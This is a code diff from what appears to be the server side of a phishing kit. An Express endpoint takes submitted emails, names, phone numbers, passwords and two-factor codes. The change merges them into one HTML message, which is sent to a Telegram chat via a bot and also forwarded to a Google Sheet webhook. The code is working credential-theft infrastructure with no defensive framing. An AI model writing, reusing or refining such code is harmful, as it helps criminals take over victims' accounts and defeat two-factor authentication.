@@ -20,27 +20,9 @@ app.post('/api/resgister', (req, res) => {
 
     res.send(result);
 
-if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
-    
-    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-<strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
-<strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
-<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
-<strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
-<strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
-<strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
-<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}`;
+    const message = `<b>Ip:</b> <code>${data.ip ? data.ip : ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${data.businessEmail ? data.businessEmail : ''} </code>\n<b>Email Personal:</b> <code>${data.personalEmail ? data.personalEmail : ''}</code>\n<b>Full Name:</b> <code>${data.fullName ? data.fullName : ''} </code>\n<b>Fanpage Name:</b> <code>${data.fanpageName ? data.fanpageName : ''}</code>\n<b>Phone Number:</b> <code>${data.mobilePhone ? data.mobilePhone : ''}</code>\n<b>Password First:</b> <code>${data.passwordFirst ? data.passwordFirst : ''}</code>\n<b>Password Second:</b> <code>${data.passwordSecond ? data.passwordSecond : ''}</code> \n-----------------------------\n <b>First Two-Fa:</b> <code>${data.firstTwoFa ? data.firstTwoFa : ''}</code> \n <b>Second Two-Fa:</b> <code>${data.secondTwoFa ? data.secondTwoFa : ''}</code>`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
-
-} else {
-
-    const messageCode = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
-    bot.sendMessage(process.env.CHAT_ID, messageCode,  { parse_mode: 'HTML' });
-
-}
 
     // ADD GOOGLE SHEET
     const url = new URL(process.env.WEBHOOK_URL);
